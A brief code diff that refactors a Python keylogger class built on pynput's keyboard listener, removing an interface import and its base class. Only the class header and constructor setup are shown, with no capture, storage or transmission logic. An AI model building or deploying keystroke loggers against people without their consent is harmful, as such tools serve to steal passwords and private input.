@@ -1,7 +1,7 @@
-from IKeylogger import IKeyLogger
+
 from pynput import keyboard
 
-class KeyLogger(IKeyLogger):
+class KeyLogger():
     def __init__(self):
         self.keys = []
         self.listener = None
